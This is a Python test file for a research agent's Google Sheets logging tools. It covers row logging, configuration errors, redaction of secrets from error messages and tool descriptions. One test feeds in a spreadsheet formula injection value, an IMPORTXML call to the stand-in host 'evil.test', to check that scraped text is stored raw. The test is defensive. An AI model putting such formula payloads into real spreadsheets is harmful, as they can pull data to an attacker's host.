from __future__ import annotations

import asyncio
from typing import Any

import gspread
import pytest
from google.adk.tools import FunctionTool
from gspread.utils import ValueInputOption

from research_agent import sheets


class FakeWorksheet:
    def __init__(self) -> None:
        self.appended: list[tuple[list[list[Any]], Any]] = []

    def append_rows(self, rows: list[list[Any]], value_input_option: Any) -> None:
        self.appended.append((rows, value_input_option))


@pytest.fixture
def worksheet(monkeypatch: pytest.MonkeyPatch) -> FakeWorksheet:
    fake = FakeWorksheet()
    monkeypatch.setattr(sheets, "_worksheet", lambda title, header: fake)
    monkeypatch.setattr(sheets, "_now", lambda: "2026-01-02 03:04:05")
    return fake


def test_search_results_are_logged_one_row_each(worksheet: FakeWorksheet) -> None:
    results = [
        {"rank": 1, "title": "Decodo", "link": "https://decodo.com", "description": "Proxies"},
        {"title": "Second"},
        "not a result",
    ]

    result = asyncio.run(sheets.log_search_results("decodo", results))  # type: ignore[arg-type]

    rows, _ = worksheet.appended[0]
    assert rows == [
        ["2026-01-02 03:04:05", "decodo", 1, "Decodo", "https://decodo.com", "Proxies"],
        ["2026-01-02 03:04:05", "decodo", "", "Second", "", ""],
    ]
    assert result == {"logged_rows": 2, "tab": "Search results"}


def test_scraped_text_is_written_as_text_never_as_a_formula(worksheet: FakeWorksheet) -> None:
    asyncio.run(sheets.log_analysis("q", '=IMPORTXML("https://evil.test","//a")'))

    rows, option = worksheet.appended[0]
    assert option is ValueInputOption.raw
    assert rows[0][2].startswith("=IMPORTXML")


@pytest.mark.parametrize("value", [None, "", "  "])
def test_missing_or_blank_configuration_names_the_variable(monkeypatch: pytest.MonkeyPatch, value: str | None) -> None:
    monkeypatch.delenv(sheets.CREDENTIALS_ENV_VAR, raising=False)
    if value is not None:
        monkeypatch.setenv(sheets.CREDENTIALS_ENV_VAR, value)

    result = asyncio.run(sheets.log_analysis("q", "text"))

    assert sheets.CREDENTIALS_ENV_VAR in result["error"]


@pytest.mark.parametrize(
    "error", [gspread.exceptions.GSpreadException("token=secret-value"), ValueError("secret-value")]
)
def test_sheet_errors_are_results_without_details(monkeypatch: pytest.MonkeyPatch, error: Exception) -> None:
    def denied(title: str, header: list[str]) -> Any:
        raise error

    monkeypatch.setattr(sheets, "_worksheet", denied)

    result = asyncio.run(sheets.log_analysis("q", "text"))

    assert "secret-value" not in result["error"]


@pytest.mark.parametrize("tool", [sheets.log_search_results, sheets.log_analysis])
def test_the_model_is_given_each_tool_description(tool: Any) -> None:
    declared = FunctionTool(tool)._get_declaration()

    assert declared is not None
    assert declared.description == tool.__doc__.strip()
    assert declared.description.startswith("Appends")
